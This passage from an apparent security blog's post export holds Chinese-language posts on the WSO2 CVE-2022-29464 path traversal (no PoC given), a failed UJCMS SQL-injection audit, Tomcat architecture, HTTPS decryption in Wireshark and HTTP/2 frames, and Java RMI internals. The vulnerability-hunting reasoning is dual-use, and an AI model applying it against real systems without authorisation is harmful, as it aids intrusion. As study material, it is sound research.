filePaths.length() - 1);</span></span><br><span class="line">            <span class="comment">//out.write(filePaths);</span></span><br><span class="line">            out.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;File upload FAILED&quot;</span>, e);</span><br><span class="line">            out.write(<span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;top.wso2.wsf.Util.alertWarning(&#x27;File upload FAILED. File may be non-existent or invalid.&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里主要是调用<code>execute</code>函数来处理文件上传请求。这里就不是获取的文件名而是<code>FieldName</code>也就是文件上传请求的<code>name</code>参数的值进行拼接<br><img src="https://i-blog.csdnimg.cn/blog_migrate/09cb5f27e9889018181e9417a894e4a5.png" alt="在这里插入图片描述"><br>这里很明显是有路径穿越的问题的，所以到这里所有的问题基本就被打通了。但还有一个困扰我的问题，就是这个路由的写法，可能只有对这个产品比较了解的人才能很好的把这个高清楚吧，放一张复现的截图<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7e28e8967577e71f88f0f07d96b1556a.png" alt="在这里插入图片描述"><br>不用管那个403，我做了别的测试，具体的poc就不发了，没意义，还是要懂原理才好。</p>
<p>当然其实在github上已经有大哥进行了详细的分析，但我还没有仔细去看</p>
<blockquote>
<p><a href="https://github.com/hakivvi/CVE-2022-29464">https://github.com/hakivvi/CVE-2022-29464</a></p>
</blockquote>
<p>官方说明</p>
<blockquote>
<p><a href="https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738">https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738</a></p>
</blockquote>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>任意文件上传</tag>
        <tag>WOS2</tag>
        <tag>CVE-2022-29464</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcat架构学习</title>
    <url>/archives/53313e1c.html</url>
    <content><![CDATA[<p>tomcat重要的概念有Server Service Connector Container Engine Host Context Wrapper</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Server</td>
<td>一个Tomcat服务器中只能有一个Server</td>
</tr>
<tr>
<td>Service</td>
<td>一个Server下可以有多个Service</td>
</tr>
<tr>
<td>Connector</td>
<td>一个Service可以有多个Connector，不同的Connector实现了不同的协议，如HTTP与AJP，这两个协议是Tomcat中模式实现的协议。Connector还负责Socket的建立，使用ProtocolHandler处理字节数据，封装request与response对象，然后使用Adaptor将Request与Response封装成HTTPRequest与HTTPResponse对象。协议处理器包含了对各类IO框架的支持，常用的为Nio(异步不阻塞) Apr Bio(Jio，阻塞)</td>
</tr>
<tr>
<td>Contaier</td>
<td>一个Service可以包含多个容器，容器是Engin,Host，Context,Wrpper顶层封装，也就是说这四个是Container的子容器，在代码层面他们都继承了Container类</td>
</tr>
<tr>
<td>Engine</td>
<td>Tomcat默认实现的引擎为Catalina，当然你也可以实现自己的引擎</td>
</tr>
<tr>
<td>Host</td>
<td>Host就是字面意思，表示不同的主机，也就是在HTTP&#x2F;1.1中的host头指定的内容，Tomcat根据该标头将请求发送给不同的StandardHost容器处理</td>
</tr>
<tr>
<td>Context</td>
<td>一个Context就是一个应用，在Tomcat的模式Host中也就是模式的webapps目录下，一个目录就是一个应用</td>
</tr>
<tr>
<td>Wrapper</td>
<td>Wapper是对Servlet的封装，一个Servlet就是一个Wapper</td>
</tr>
</tbody></table>
<p>四个子容器在调用的时候使用的是责任链模式，每个容器通过Pipline管道串联起来，每个Pipline中包含了一系列的Valve(阀门)，Tomcat模式每个容器实现了一个标准的Valve，分别为StandardEnginValve,StandardHostValve,StandardContextValve,StandardWrapperValve，这四个管道在每个容器中放在各自的顶层被最后一个调用，负责串联下一个容器的,这四个管道中的invoke方法负责调用下一个容器的的第一个Valve<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2291dbc663b4f22e4a333b392386cc27.png" alt="在这里插入图片描述"><br>就这样四个容器被串联起来，最后的StandardWrapperValve负责将请求与响应传递到FilterChain，执行一系列过滤器。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3d80cb5154af0061144ce94d257a2918.png" alt="在这里插入图片描述"><br>我们也可以在Tomcat的server.xml文件中在各个容器下自定义一系列的Valve来回请求进行拦截过滤。请求在经过一系列过滤器后由最后一个过滤器调用servlet的service方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/512b8451cd7715f905b2a8465b18e0ec.png" alt="在这里插入图片描述"><br>最终service方法根据请求的方式调用对应的doGet、doPost等方法，完成整个流程的闭环。</p>
<p>Tomcat整个设计使用了JMX（Java Manager Extension）来实现对整个应用的监控，于是可以使用JConsole进行监控，要实现一个JMX应用需要实现一个一个的MBean，作为被监控的对象，然后提供一个MBeanServer 来对所有的Mbean进行监控。</p>
<p>Tomcat在每个流程的实现中还大量使用了观察者模式来进行生命周期管理<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a3be82bb692e8b498f9b2b311e2f9ef3.png" alt="在这里插入图片描述"><br>观察者模式一般需要三类对象，分别是Subject OBClient  OBServer。Subject负责注册一个个观察者，与通知所有观察者，OBserver为一个个的观察者，一般需要定义一个接口，然后根据需要实现一个个观察者对象，OBclient为被观察对象，当被观察对象的状态发生变化的时候会通知Subject，由其通知所有的观察者做对应的操作。在Tomcat中LifeCycle作为接口由抽象类LifeCycleBase部分实现，凡是继承了LifeCycleBase类的子类都作为一个个观察者，其提供了addLifecycleListener方法注册一个个监听器，也就是一系列的观察者，当被观察者状态（启动过程的推进、init\load\start等）发生变化时由LifeCycleBase#fireLifecycleEvent方法调用各个监听器的lifecycleEvent方法发送通知给所有的观察者。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4d89df83b388792b2f8dee1374eb0e8a.png" alt="在这里插入图片描述"><br>下回分解，Tomcat启动流程。。。。。</p>
]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>一次失败的JAVA代码审计-SQL注入</title>
    <url>/archives/b8d90c0d.html</url>
    <content><![CDATA[<p>本次审计的CMS系统为UJCMS最新版。立足于我现在的审计水平暂时是没有发现该系统的漏洞的，拉胯。本来今天晚上跟一个SQL注入的点跟的本来都要大功告成了，结果被当头棒喝，学会了什么叫人生的参差。废话不多说直接开干。<br>直接在整个项目中搜索关键字 <code>order by $&#123;</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/82739f44b0d9fd7572daa223c583c0be.png" alt="在这里插入图片描述"><br>那么如果这个<code>queryInfo.orderBy</code>可控的话就皆大欢喜了，目前来看有很大机会<br><img src="https://i-blog.csdnimg.cn/blog_migrate/46b91c4c867dea6874e9f5b174651dd2.png" alt="在这里插入图片描述"><br>这里注意到order by 是在一条id为<code>Select_ALL</code>的语句中，对应的<code>mybatis</code>文件名为<code>SeqMapper.xml</code>，最开始的时候我就去找对应名称的<code>DAO</code>层实现类，结果一直没有找到。最后迫不得已直接来了个全局搜索<br><img src="https://i-blog.csdnimg.cn/blog_migrate/254a328e59662d472abdba7abd98d13f.png" alt="在这里插入图片描述"><br>注意到<code>Select_ALL</code>出现在其他的<code>mybatis</code>映射文件的<code>include</code> 标签里，这个标签就和php里的include或者require一个功能，用作代码复用。那么我们随便进入一个<code>mapper.xml</code>，这里以<code>Article.mapper</code>为例。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82b1150a5d9c2d9bc9318d3b99103b37.png" alt="在这里插入图片描述"><br>这里的sql语句id为<code>selectAll</code>，返回值类型为<code>ResultMap</code>，然后找到对应的<code>DAO</code>层实现类<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4ab6fbb786f6ba96f10eb785e26d3065.png" alt="在这里插入图片描述"><br>注意到这里是个接口而不是实现类，这是因为<code>@Mapper  @Repository</code> 这两个注解的功劳@Mapper可以使接口在编译时自动生成器实现类，@Repositry注解帮助实现自动注入。然后就是取找对应的<code>Services</code>层，这里也是去找对应文件名，不出意外是<code>ArticleService.java</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f4a52e3de92113b3c20724aa72956ae.png" alt="在这里插入图片描述"><br>看到这里注入了<code>AticleMapper</code>，然后在在当前文件搜索哪里调用了<code>selectAll</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/518c76667202e3f11ddd6ca906bff8e8.png" alt="在这里插入图片描述"><br>然后就是找对应的控制器<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e1897c2399c77c6629719e39e9d52bf5.png" alt="在这里插入图片描述"><br>这么多，根据命名的规则，我们直接进入<code>ArticleController</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1ee837af9def4c318f55e9699ea9b466.png" alt="在这里插入图片描述"><br>然后搜索有没有调用<code>AritcleService.selectAll</code>方法的语句，一搜，啪，没有咋整，不要换，在回去<code>ArticleService</code>里面看看有没有类本地的调用<br><img src="https://i-blog.csdnimg.cn/blog_migrate/718dab1f95329a3b947da5e612dda9c8.png" alt="在这里插入图片描述"><br><code>selectList</code>方法调用了，再回到<code>ArticleController</code>看看有没有调用<code>selectList</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/99ef6f21f07c0a3b05bf5d4b44cbbc79.png" alt="在这里插入图片描述"><br>这儿调用了，对应的路由为<code>/api/article</code><br>然后就是看参数是否可控了，这里我么你可以控制的参数有三个，分别是<code>params,queryMap,customsQueryMap</code><br>看看这三个参数怎么来的，跟到对应的query函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bbf42a23df56077d010c3608e991ad8e.png" alt="在这里插入图片描述"><br>在<code>query</code>函数中为上述三个参数赋值，<code>params</code>来自客户端传的参，<code>queryMap</code>与<code>customsMap</code>同样来自于客户端传的参，不过有要求，参数中前缀为<code>Q_</code>的参数会被添加到<code>queryMap</code>，前缀为<code>custom</code>的参数会被添加到<code>customsMap</code>中，然后调用<code>ArticleListDirective.assemble</code>对<code>queryMap</code>参数进行处理，跟进去看看<br>该函数前面都不重要，直到最后一条语句<br><img src="https://i-blog.csdnimg.cn/blog_migrate/714c1936bd2e7b019ab31c6801599133.png" alt="在这里插入图片描述"><br>这里就有处理<code>orderBy</code>了，注意到有一个默认值，如果搞不好就得使用这个默认值，我们当然是不想的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e487e7b309c50c8a857d125af9804d8f.png" alt="在这里插入图片描述"><br>调用<code>getString</code>函数进行处理，然后把结果添加到<code>queryMap</code>中，跟进<code>getString</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/4335735042134ca1845e7eadff1f535b.png" alt="在这里插入图片描述"><br>重点来了，敲黑板，要考，注意到如果value为空则使用默认值，不为空则使用从param中获取的值，简直皆大欢喜啊。。。。<br>这时候我们只需要传参<code>orderBy=xxxx</code>就可以控制value的值了，简直完美，然后接着往下走。接下来queryMap会被传入到<code>selectList</code>函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/afb5e6d4b004c18036df1cfa52cb0846.png" alt="在这里插入图片描述"><br>然后传入<code>selectAll</code> 然后mybatis从queryInfo中获取到orderBy的值，然后拼接到sql语句中，注入完成，于是我就试了下，然后就报错了。。。。。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ed045dfdeee0302e085577626fa6481.png" alt="在这里插入图片描述"></p>
<p>哦豁，白名单，完蛋。到这里基本上就失败了，不过我们还要去看一看怎么拦的，这里报错注意到是在<code>QueryParser</code>解析的时候限制了白名单，最后定位到这里<br><img src="https://i-blog.csdnimg.cn/blog_migrate/791ada2e53ee84118d82feb21c5eb9b0.png" alt="在这里插入图片描述"><br>跟进去<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3768c9c3ce96f2e60702fe9c3fe0c8dd.png" alt="在这里插入图片描述"><br>继续到parse函数最后一行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4e6fda6669c7b46c6f08dfdf4aebf804.png" alt="在这里插入图片描述"><br>跟进<code>parseOrderBy</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/99806a2b16e0e7ea3777e19f7029ae2f.png" alt="在这里插入图片描述"><br>他妈的，我一眼就注意到这里的<code>preventInjection</code>，进去看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aa41d49a6862016da9fcd45c4a4784b8.png" alt="在这里插入图片描述"><br>。。。。根源在这里</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>从Wireshark抓取HTTPS流量到HTTP2协议</title>
    <url>/archives/e8476a7d.html</url>
    <content><![CDATA[<h1 id="吹水"><a href="#吹水" class="headerlink" title="吹水"></a>吹水</h1><p>打工人今天正无聊在小蓝鸟上看看国外的大哥们最近有没有又搞什么大动作，突然看到一条推文介绍使用wireshark抓取https报文的方法，正好前段时间也在公众号看到了一篇文章教这个，当时配置好了但没有去实际验证过好使不，于是趁着上班时间不验证白不验证，我这不是划水，我这是在打造生产工具，为下一步提升生产力打下良好的基础。<br>配置其实相对来说还是很简单的，首先是需要设置一下环境变量增加一项SSLKEYLOGFILE指向一个文本文件就好了，这样谷歌或者火狐浏览器在运行的时候就会将每次https会话的加密秘钥存储在这个文件里面，然后再wireshark中配置一下TLS协议的认证文件也指向这个文件就ok了，当然这个原理是我自己理解的，不过想来也就八九不离十了。想要知道详情的可以参看下面两篇文章咯</p>
<blockquote>
<p><a href="https://mp.weixin.qq.com/s/jUFT1iA6Uy7EKJAFkebjDw">https://mp.weixin.qq.com/s/jUFT1iA6Uy7EKJAFkebjDw</a><br><a href="https://twitter.com/binitamshah/status/1511254916484198402?s=20&t=qrF9mz6muHovokRB5nGPkg">https://twitter.com/binitamshah/status/1511254916484198402?s=20&amp;t=qrF9mz6muHovokRB5nGPkg</a></p>
</blockquote>
<span id="more"></span>
<p>最终的实现效果是这样的<br><img src="https://i-blog.csdnimg.cn/blog_migrate/da6b1188291a0cb3faaa42a16cb0f24a.png" alt="在这里插入图片描述"><br>看到这里我陷入了疑问，平时我们用burp抓的包都是HTTP1.1版本的，怎么到了wireshark这里之后就变成HTTP2版本的了，于是我使用有道翻译做了个实验。首先使用Burp抓包然后再发包使用wireshark抓包之后发现报文还是正常的HTTP1.1版本的，在wireshark中使用HTTP2协议过滤器捕获不到这部分流量，当我直接使用浏览器访问时却是能后正常使用http2协议过滤器看到这些报文，据说是有HTTP协议协商机制</p>
<blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1420299">https://cloud.tencent.com/developer/article/1420299</a></p>
</blockquote>
<p>当看到这个wireshark抓到的http协议流量的时候我来了兴趣，于是去学习了一下HTTP2协议的知识。<br>HTTP2协议相比于HTTP1.1协议有很大的不同，首先2版本的协议使用的是字节来传输数据而不是文本，其次2版本的协议是双向的协议，这主要得益于服务端推送机制，然后2版本的协议是没有阻塞与等待的可以并行的发送多个请求，再有2版本的协议一个域名就是一个连接，不像1版本的协议一次请求就是一次新的连接，这极大的节约了资源，提高了效率，再有就是头部压缩算法，鉴于1版本协议每次请求都需要发送大量的重复的头信息，2版本在这方面进行了优化。</p>
<h1 id="HTTP2协议简介"><a href="#HTTP2协议简介" class="headerlink" title="HTTP2协议简介"></a>HTTP2协议简介</h1><p>详情可参考这篇文章</p>
<blockquote>
<p><a href="https://www.jianshu.com/p/e57ca4fec26f">https://www.jianshu.com/p/e57ca4fec26f</a></p>
</blockquote>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在HTTP2中有几个关键词，帧、请求、流、连接。一个请求就是一个流，一个流由多个帧组成，一个域名一个连接，一个连接里有多个请求。不同流的帧是可以同时并发请求的，但是同一个流中的帧是有严格的顺序的，客户端请求一个页面可能需要发送多次请求，在HTTP2中因为服务端推送的存在可以减轻客户端请求的压力，只需一次请求服务端可以主动向服务端推送需要的配套资源，当然客户端如果缓存没有过期等还可以拒收。<br>HTTP2协议的单独的一个帧有统一的格式。包括固定9字节的帧头以及负载也就是数据部分。<br>在帧头中包括帧长（24）帧类型（8）标志位（8）R（1保留位）帧ID（31位）<br>其中标志位的格式取决于帧类型。</p>
<h2 id="帧类型"><a href="#帧类型" class="headerlink" title="帧类型"></a>帧类型</h2><p>帧类型包括</p>
<table>
<thead>
<tr>
<th>帧类型</th>
<th>中文</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>HEADERS</td>
<td>报头帧 (type&#x3D;0x1)</td>
<td>用来打开一个流或者携带一个首部块片段，基本就相当于1.1版本的请求头部分</td>
</tr>
<tr>
<td>DATA</td>
<td>数据帧 (type&#x3D;0x0)</td>
<td>装填主体信息，可以用一个或多个 DATA 帧来返回一个请求的响应主体</td>
</tr>
<tr>
<td>PRIORITY</td>
<td>优先级帧 (type&#x3D;0x2)</td>
<td>指定发送者建议的流优先级，可以在任何流状态下发送 PRIORITY 帧，包括空闲 (idle) 和关闭 (closed) 的流</td>
</tr>
<tr>
<td>RST_STREAM</td>
<td>流终止帧 (type&#x3D;0x3)</td>
<td>流终止帧 (type&#x3D;0x3)，用来请求取消一个流，或者表示发生了一个错误，payload 带有一个 32 位无符号整数的错误码 (Error Codes)，不能在处于空闲 (idle) 状态的流上发送 RST_STREAM 帧</td>
</tr>
<tr>
<td>SETTINGS</td>
<td>设置帧 (type&#x3D;0x4)</td>
<td>设置此 连接 的参数，作用于整个连接，一般是一次连接的第一个帧，当然前面的协议前言不算的话</td>
</tr>
<tr>
<td>PUSH_PROMISE</td>
<td>推送帧 (type&#x3D;0x5)</td>
<td>服务端推送，客户端可以返回一个 RST_STREAM 帧来选择拒绝推送的流</td>
</tr>
<tr>
<td>PING</td>
<td>PING 帧 (type&#x3D;0x6)</td>
<td>判断一个空闲的连接是否仍然可用，也可以测量最小往返时间 (RTT)</td>
</tr>
<tr>
<td>GOAWAY</td>
<td>GOWAY 帧 (type&#x3D;0x7)</td>
<td>用于发起关闭连接的请求，或者警示严重错误。GOAWAY 会停止接收新流，并且关闭连接前会处理完先前建立的流</td>
</tr>
<tr>
<td>WINDOW_UPDATE</td>
<td>窗口更新帧 (type&#x3D;0x8)</td>
<td>用于执行流量控制功能，可以作用在单独某个流上 (指定具体 Stream Identifier) 也可以作用整个连接 (Stream Identifier 为 0x0)，只有 DATA 帧受流量控制影响。初始化流量窗口后，发送多少负载，流量窗口就减少多少，如果流量窗口不足就无法发送，WINDOW_UPDATE 帧可以增加流量窗口大小</td>
</tr>
<tr>
<td>CONTINUATION</td>
<td>延续帧 (type&#x3D;0x9)</td>
<td>用于继续传送首部块片段序列</td>
</tr>
</tbody></table>
<h2 id="DATA帧"><a href="#DATA帧" class="headerlink" title="DATA帧"></a>DATA帧</h2><p>DATA帧的payload部分已8位的填充长度开头，然后是正式的数据部分，最后根据填充长度字段指定的长度在末尾填充对应数量的0<br>看一下实际的帧<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fbb55e776451089a2079bcc7e3b4523b.png" alt="在这里插入图片描述"><br>可以看到DATA帧的标志位分成了三部分分别为保留位、填充标志、是否为当前流的结束包三个字段</p>
<h2 id="HEADERS帧"><a href="#HEADERS帧" class="headerlink" title="HEADERS帧"></a>HEADERS帧</h2><p>同样的HEADERS帧也是以8位填充长度字段开头，然后是1位的流依赖申明，31位的依赖流ID、8位的优先级、压缩头部、填充值<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f400f0bb602346560e078f4bca820ca1.png" alt="在这里插入图片描述"><br>标志位包括保留位、优先级标识、填充标识、是否为当前流的最后一个头部包、是否为当前流的最后一个包</p>
<h2 id="SETTINGS-帧"><a href="#SETTINGS-帧" class="headerlink" title="SETTINGS 帧"></a>SETTINGS 帧</h2><p>SETTINGS帧的就包括两部分分别为设置项ID以及其值<br>设置项一般包含一下项目</p>
<table>
<thead>
<tr>
<th>设置项</th>
<th>ID</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>SETTINGS_HEADER_TABLE_SIZE</td>
<td>0x1</td>
<td>用于解析 Header block 的 Header 压缩表的大小，初始值是 4096 字节</td>
</tr>
<tr>
<td>SETTINGS_ENABLE_PUSH</td>
<td>0x2</td>
<td>可以关闭 Server Push，该值初始为 1，表示允许服务端推送功能</td>
</tr>
<tr>
<td>SETTINGS_MAX_CONCURRENT_STREAMS</td>
<td>0x3</td>
<td>代表发送端允许接收端创建的最大流数目</td>
</tr>
<tr>
<td>SETTINGS_INITIAL_WINDOW_SIZE</td>
<td>0x4</td>
<td>指明发送端所有流的流量控制窗口的初始大小，会影响所有流，该初始值是 2^16 - 1(65535) 字节，最大值是 2^31 - 1，如果超出最大值则会返回 FLOW_CONTROL_ERROR</td>
</tr>
<tr>
<td>SETTINGS_MAX_FRAME_SIZE</td>
<td>0x5</td>
<td>指明发送端允许接收的最大帧负载的字节数，初始值是 2^14(16384) 字节，如果该值不在初始值 (2^14) 和最大值 (2^24 - 1) 之间，返回 PROTOCOL_ERROR</td>
</tr>
<tr>
<td>SETTINGS_MAX_HEADER_LIST_SIZE</td>
<td>0x6</td>
<td>通知对端，发送端准备接收的首部列表大小的最大字节数。该值是基于未压缩的首部域大小，包括名称和值的字节长度，外加每个首部域的 32 字节的开销</td>
</tr>
</tbody></table>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/6c1518eb180419c56d1cde1f8f3c1325.png" alt="在这里插入图片描述"><br>标志位就ACK比较重要，这个标识位是在收到对端发送的SETTINGS帧时向对端回复时设置的，用以确认已收到报文。<br>然后一次完整的连接过程是以Magic帧开头GOAWAY帧结尾的，但在我观察实际流量时发现却没有GOAWAY帧</p>
]]></content>
      <categories>
        <category>协议规范</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
        <tag>https</tag>
        <tag>http2</tag>
      </tags>
  </entry>
  <entry>
    <title>从代码层面看RMI规范的实现与攻击原理（一）</title>
    <url>/archives/ca82fc3b.html</url>
    <content><![CDATA[<p>@<a href="%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8BRMI%E8%A7%84%E8%8C%83%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89">TOC</a></p>
<p>上一篇文章粗糙的讲了RMI规范相关的一些内容，今天通过代码跟踪了一下具体的实现过程，发现昨天的理解有一些是错误的，首先看一段客户端的代码：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dc2c46acd260661e09a2d95aad5d5816.png" alt="在这里插入图片描述"><br>我们重点关注第15行与16行，这两行分别是获得一个注册器与从hash表中查询market键对应的对象的操作，我们首先打断掉跟进到<code>LocateRegistry#getRegistry</code>方法里面：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                       RMIClientSocketFactory csf)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (port &lt;= <span class="number">0</span>)</span><br><span class="line">            port = Registry.REGISTRY_PORT;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// If host is blank (as returned by &quot;file:&quot; URL in 1.0.2 used in</span></span><br><span class="line">            <span class="comment">// java.rmi.Naming), try to convert to real local host name so</span></span><br><span class="line">            <span class="comment">// that the RegistryImpl&#x27;s checkAccess will not fail.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// If that failed, at least try &quot;&quot; (localhost) anyway...</span></span><br><span class="line">                host = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Create a proxy for the registry with the given host, port, and</span></span><br><span class="line"><span class="comment">         * client socket factory.  If the supplied client socket factory is</span></span><br><span class="line"><span class="comment">         * null, then the ref type is a UnicastRef, otherwise the ref type</span></span><br><span class="line"><span class="comment">         * is a UnicastRef2.  If the property</span></span><br><span class="line"><span class="comment">         * java.rmi.server.ignoreStubClasses is true, then the proxy</span></span><br><span class="line"><span class="comment">         * returned is an instance of a dynamic proxy class that implements</span></span><br><span class="line"><span class="comment">         * the Registry interface; otherwise the proxy returned is an</span></span><br><span class="line"><span class="comment">         * instance of the pregenerated stub class for RegistryImpl.</span></span><br><span class="line"><span class="comment">         **/</span></span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                        <span class="literal">false</span>);</span><br><span class="line">        <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">            (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>该方法是一个重载方法，我们调用的方法有三个参数分别是<code>host, port, csf</code>，比较疑惑的可能就是csf了，该参数传递的是一个<code>RMIClientSocketFactory</code>接口的对象，我们跟进去看一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/433a37af554e1cc218c20ac9b9ae652b.png" alt="在这里插入图片描述"><br>根据名字很容易看到只要有一个该接口的实现类调用了<code>createSocket</code>方法就会创建一个socket，继续回到<code>getRegistry</code>方法<br>它首先判断了你是否为你的方法传入了<code>port</code>参数，如果没有传入，则获取系统默认的端口<code>1099</code><br>然后判断你是否传入了主机名，如果你没有传入则会使用本地主机名，<code>loacahost</code>。<br>下一步将会创建一个LiveRef对象，至于干什么的我不清楚，简单看了看就是为一些变量赋值，后面会用到它们：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/73f8cc3eba58a21d03f3c0379b897e01.png" alt="在这里插入图片描述"><br>可以看到<code>host, port,csf</code>都被他使用了。具体是通过<code>TCPEndpoint</code>这个方法传进去的，这些方法的作用具体不太清楚，毕竟不是专业的。<br>然后创建了一个<code>RemoteRet</code>对象，<br><code>csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef)</code><br>如果csf为null，则实例化<code>UnicastRef</code><br>我们跟进去看一看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/94eca87ca47b8a9a0ee84f7a6c84ee6a.png" alt="在这里插入图片描述"><br>我们看这个单播引用类是实现了<code>RemoteRef</code>接口的<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f4cf160b5bfbfc4d6fbb7ba9c2ca7b1c.png" alt="在这里插入图片描述"><br>而这个<code>RemoteRef</code>接口又是继承了<code>Externalizable</code>接口，这意味着该类可以被序列化与反序列化。<br>我们实例化时调用的构造方法是这一个：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7364e60c6051154f22ac6c0babd799cd.png" alt="在这里插入图片描述"><br>ref是一个LiveRef类型的变量。除了这个动作没有其他的动作了<br>心血来潮我又回去看了一下<code>LiveRef</code>类，他继承了Cloneable接口，证明它可以被克隆，至于什么事克隆暂时不清楚，写完了去看看。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6bdb8f78323c8e77298a6556f840e565.png" alt="在这里插入图片描述"><br>继续回到<code>getRegistry</code>方法，<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e2008aa62eb947f81a31d64c989d8eb7.png" alt="在这里插入图片描述"><br>createProxy方法接受了三个参数，第一个是<code>RegistryImpl</code>类的Class实例，第二个是上面提到的ref，第三个是一个boolean值，看提示是是否强制使用Stub，我们这里传递的是<code>false</code>，也就是不使用。<br>我们跟进该方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                     RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                     <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        Class&lt;?&gt; remoteClass;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            remoteClass = getRemoteClass(implClass);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title 